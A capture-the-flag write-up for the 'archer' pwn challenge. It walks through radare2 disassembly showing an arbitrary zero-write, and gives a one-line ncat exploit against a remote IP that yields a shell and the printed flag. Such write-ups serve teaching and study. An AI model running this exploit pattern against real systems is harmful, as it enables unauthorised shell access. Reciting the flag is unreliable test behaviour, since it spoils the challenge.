# ARCHER
```
It's battle time! We're giving you one shot, one kill - choose wisely.
```

- File  : [archer](../attachements/archer/archer)

The binary ask us to send an arrow to win a battle,\
the goal is to spawn a shell by not verifying this conditional jump @0x0040123b
```
│           0x0040122e      488b05332e00.  mov rax, qword [obj.code]   ; [0x404068:8]=0x13371337 ; "7\x137\x13"
│           0x00401235      483d37133713   cmp rax, 0x13371337
│       ┌─< 0x0040123b      750a           jne 0x401247
│       │   0x0040123d      bf00000000     mov edi, 0
│       │   0x00401242      e849feffff     call sym.imp.exit
│       │   ; CODE XREF from main @ 0x40123b
│       └─> 0x00401247      488d3d6b0e00.  lea rdi, str.WE_WON_        ; 0x4020b9 ; "WE WON!"
│           0x0040124e      e8ddfdffff     call sym.imp.puts
│           0x00401253      488b05162e00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404070:8]=0
│           0x0040125a      4889c7         mov rdi, rax
│           0x0040125d      e80efeffff     call sym.imp.fflush
│           0x00401262      488d3d580e00.  lea rdi, str._bin_sh        ; 0x4020c1 ; "/bin/sh"
│           0x00401269      e8d2fdffff     call sym.imp.system
│           0x0040126e      b800000000     mov eax, 0
│           0x00401273      c9             leave
└           0x00401274      c3             ret
```

before that it asks us to give him a target, here a memory address :
```
┌ 111: sym.makeshot ();
│           ; var int64_t var_8h @ rbp-0x8
│           0x00401275      55             push rbp
│           0x00401276      4889e5         mov rbp, rsp
│           0x00401279      4883ec10       sub rsp, 0x10
│           0x0040127d      488d3d450e00.  lea rdi, str.Heres_your_arrow_ ; 0x4020c9 ; "Here's your arrow!"
│           0x00401284      e8a7fdffff     call sym.imp.puts
│           0x00401289      488d3d500e00.  lea rdi, str.Now__which_soldier_do_you_wish_to_shoot_ ; 0x4020e0 ; "Now, which soldier do you wish to shoot?"
│           0x00401290      e89bfdffff     call sym.imp.puts
│           0x00401295      488b05d42d00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404070:8]=0
│           0x0040129c      4889c7         mov rdi, rax
│           0x0040129f      e8ccfdffff     call sym.imp.fflush
│           0x004012a4      488d45f8       lea rax, [var_8h]
│           0x004012a8      4889c6         mov rsi, rax
│           0x004012ab      488d3d570e00.  lea rdi, [0x00402109]       ; "%p"
│           0x004012b2      b800000000     mov eax, 0
│           0x004012b7      e8c4fdffff     call sym.imp.__isoc99_scanf
│           0x004012bc      488b45f8       mov rax, qword [var_8h]
│           0x004012c0      480500005000   add rax, 0x500000
│           0x004012c6      488945f8       mov qword [var_8h], rax
│           0x004012ca      488b45f8       mov rax, qword [var_8h]
│           0x004012ce      48c700000000.  mov qword [rax], 0
│           0x004012d5      488d3d300e00.  lea rdi, str.Shot_          ; 0x40210c ; "Shot!"
│           0x004012dc      e84ffdffff     call sym.imp.puts
│           0x004012e1      90             nop
│           0x004012e2      c9             leave
└           0x004012e3      c3             ret
```

In this function a null byte is placed at the address +0x500000 you type via scanf\
The solution is to give the memory address of 0x13371337 @0x404068 minus 0x500000
```
$ ( echo yes ; python -c "print(hex(0x404068-0x500000))" ; cat ) | ncat 193.57.159.27 43092
It's battle day archer! Have you got what it takes?
Answer [yes/no]: Awesome! Make your shot.
Here's your arrow!
Now, which soldier do you wish to shoot?
Shot!
Hope you shot well! This will decide the battle.
WE WON!
ls
archer
flag_0a52f21b1a.txt
cat flag_0a52f21b1a.txt
rarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9}
```

flag : `rarctf{sw33t_sh0t!_1nt3g3r_0v3rfl0w_r0cks!_170b2820c9}`